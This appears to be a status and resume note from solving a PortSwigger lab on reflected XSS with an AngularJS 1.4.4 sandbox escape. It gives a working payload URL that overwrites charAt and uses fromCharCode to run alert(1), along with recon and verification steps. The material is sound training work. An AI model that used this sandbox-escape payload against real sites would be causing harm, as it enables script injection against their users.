# RESUME — Reflected XSS with AngularJS sandbox escape without strings

**Status: COMPLETE — lab solved and verified. Nothing pending on the target.**

## Where things stand

* Lab instance `0a4b007b042c8475835b4be200ca003c` is **solved**
  (`widgetcontainer-lab-status is-solved`, `<p>Solved</p>`). Instances are
  single-user and stay solved.
* The flip was observed live: baseline `is-notsolved` at 22:24:17Z → exploit
  request at 22:25:50Z (same response still `is-notsolved`) → `is-solved` by
  22:25:56Z. It was triggered by the recon request, **not** by `solve.py`, so the
  solver correctly reports `caused by solver: no (was already solved)`.
* Solver: `solve.py`, exit 0, **6 requests**, **2.4 s**.
* Root launcher: exact folder-name match, exit 0, solver 2.4 s / total 2.8 s.
* Launcher tests: 27 passed / 0 failed; `tests/test_clean.py` 6 passed.
* Browser proof (CDP, Chromium): exploit URL fires `alert(1)`; the `7*7` control
  and the vector without the `charAt` overwrite do not.

## Re-verification on a fresh instance

```bash
cd /root/Desktop/PortSwigger_Labs
uv run python solve.py --url "https://<new-lab-id>.web-security-academy.net/"
```

Nothing is hardcoded: title, AngularJS version, sink and the expression are
discovered at runtime; percent-encoding of `=` is computed by the solver.

Manual path if the solver ever fails:

1. `GET /` → expect `<title>Reflected XSS with AngularJS sandbox escape without strings</title>`,
   `/resources/js/angular_1-4-4.js`, `<body ng-app=labApp>`, widget `is-notsolved`.
2. `GET /?search=1&foo=bar` → each parameter becomes
   `var key = '<name>'; $scope.query[key] = '<value>'; $scope.value = $parse(key)($scope.query);`
   ⇒ the **name** is an Angular expression.
3. `GET /?search=1&7*7=x` → key `7*7` reflected; open in a browser, the heading
   renders `49`.
4. `GET /?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
   → `alert(1)` in the browser.
5. Poll `/` for up to a minute: the widget flips to `is-solved` ~6 s after the
   request; the exploit response itself still says *Not solved*.

## Known failure modes

| Symptom | Cause |
|---|---|
| `error: the sandbox-escape expression was not reflected intact` | the internal `=` was sent raw (must be `%3d`) or the parameter was re-encoded by the client |
| exploit URL returns 400 | punctuation stripped by a client that percent-encodes `[ ] \| ( ) ,`; send the raw path |
| `error: AngularJS ... has no sandbox` | instance serves AngularJS ≥ 1.6 — different lab |
| lab stays `is-notsolved` | polled only once; the check lags the request by seconds |
| `caused by solver: no (was already solved)` | expected on this instance |
| launcher "ambiguous" | another folder normalises to the same name |

## Session facts worth keeping

* Difficulty **EXPERT** — read from the rendered Academy description page
  (`widget-container-labelevel`), not from the instance HTML.
* `GET /exploit` → 404 and no `#exploit-link`: the lab has **no exploit server**;
  the check is server-side on the crafted request.
* `alert(1)` is optional for the flip but is the objective; it was proven in a
  real browser (see `evidence/browser-alert-proof.txt`).
